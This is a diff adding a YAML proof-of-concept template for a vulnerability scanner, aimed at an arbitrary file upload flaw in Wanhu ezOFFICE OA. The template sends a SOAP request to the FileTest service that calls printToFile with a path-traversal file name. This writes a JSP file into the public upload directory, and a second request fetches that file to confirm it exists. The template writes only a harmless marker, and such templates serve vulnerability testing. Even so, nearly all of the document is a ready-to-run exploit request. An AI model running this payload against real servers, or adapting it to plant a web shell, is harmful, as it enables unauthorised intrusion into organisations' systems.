@@ -1,0 +1,30 @@
+id: poc-yaml-wanhu-oa-filetest-anyfile-upload
+info:
+  name: 万户OA FileTest 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+requests:
+- method: POST
+  path: /defaultroot/services/FileTest;1.js
+  headers:
+    Content-Disposition: attachment; filename="filename.jpg"
+    SOAPAction: 1
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \n    xmlns:util=\"http://com.whir.ezoffice.ezform.util.StringUtil\"\n    xmlns:soapenc=\"\
+    http://schemas.xmlsoap.org/soap/encoding/\">\n    <soapenv:Header/>\n    <soapenv:Body>\n\
+    \        <util:printToFile soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\
+    >\n            <fileName xsi:type=\"soapenc:string\">../server/oa/deploy/defaultroot.war/public/upload/date.jsp.</fileName>\n\
+    \            <content xsi:type=\"soapenc:string\">&#x34;&#x72;&#x61;&#x31;&#x6e;</content>\n\
+    \        </util:printToFile>\n    </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"xml version") && contains(body,"soapenv")
+- method: GET
+  path: /defaultroot/public/upload/date.jsp;.js
+  expression: status_code == 200 && contains(body,"4ra1n")
+variables: {}
+transport: http
